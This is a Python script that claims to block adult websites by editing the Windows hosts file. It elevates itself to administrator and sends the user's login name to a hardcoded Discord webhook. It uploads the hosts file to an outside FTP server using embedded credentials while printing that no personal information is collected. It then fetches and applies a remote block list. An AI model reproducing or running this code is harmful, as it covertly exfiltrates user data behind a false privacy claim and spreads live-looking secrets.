import os
import random
import string
import time
import git
import ftplib
from datetime import date, datetime
from discordwebhook import Discord
import getpass
import pyuac


if __name__ == "__main__":
    if not pyuac.isUserAdmin():
        print("Re-launching as admin!")
        pyuac.runAsAdmin()

username= getpass.getuser()
now = datetime.now()
current_time = now.strftime("%H_%M_%S")
time_now = current_time
today = date.today()

discord = Discord(url="https://discord.com/api/webhooks/1083237724435251271/riTXij8U78f0nWV7zoeUZLyhXTh9RAjrv1HnxKBVfeegkU6fsKmj37txS6e5Ru1W8Jw-")
discord.post(content=f"{today}___{time_now} - Running as {username}\n")

print("An active internet connection is required for this program to work properly.\n")
print("This program will help you block adult websites on your computer.")
print("No personal information will be collected.")
print("This program is not affiliated with any company.")
print("This program is not responsible for any damage caused to your computer. (Just kidding)")
print("No warranty is provided.")
print("This program is provided as is.")
print("No refunds are provided.")
print("VPN Services can't block this program.\n\n")
print("Starting the program\n\n")
print("backing up...\n\n")
time.sleep(3)

session = ftplib.FTP('ftpupload.net','epiz_32571270','wdGAnQMbAqnW')
file = open("C:\Windows\System32\drivers\etc\hosts",'rb')                  # file to send
session.storbinary(f'STOR Python/Block_List/hosts____{username}___{today}___{time_now}', file)     # send the file
file.close()                                    # close file and FTP
session.quit()

print("backup complete\n\n")

def random_char(y):
    return "".join(
        random.choice(string.ascii_letters) for x in range(y))

random_num = random_char(10)

main_dir = f"C:/Windows/Temp/{random_num}"
os.mkdir(main_dir)
print("Downloading URL list\n\n")
git.Git(main_dir).clone("https://gist.github.com/efef5583f5d6c1746c08c1102f923ebc.git")
print("URL list downloaded\n\n")

print("Blocking websites (Over 15000+)\n\n")
hosts=open('C:\Windows\System32\drivers\etc\hosts','a+')
url_list=open(f"C:/Windows/Temp/{random_num}/efef5583f5d6c1746c08c1102f923ebc/url_list", 'r+')
n=0
while True:
    print(n,"% completed")
    n+=1
    if n==101:
        break

input("Press enter to close the window. >")

reading=url_list.read()
hosts.write(reading)
print("Blocking completed\n\n")
hosts.close()
url_list.close()
print("Deleting temporary files\n\n")
os.remove(f"C:/Windows/Temp/{random_num}/efef5583f5d6c1746c08c1102f923ebc/url_list")
os.rmdir(f"C:/Windows/Temp/{random_num}/efef5583f5d6c1746c08c1102f923ebc")
os.rmdir(f"C:/Windows/Temp/{random_num}")
print("Temporary files deleted\n\n")
print("Program completed\n\n")
print("Please restart your computer to apply changes\n\n")
print("Thank you for using this program\n\n")
print("Please consider donating to support this project\n\n")
print("If you want to enable adult websites again, please contact me(github.com/matheesha-pathirana)\n\n")

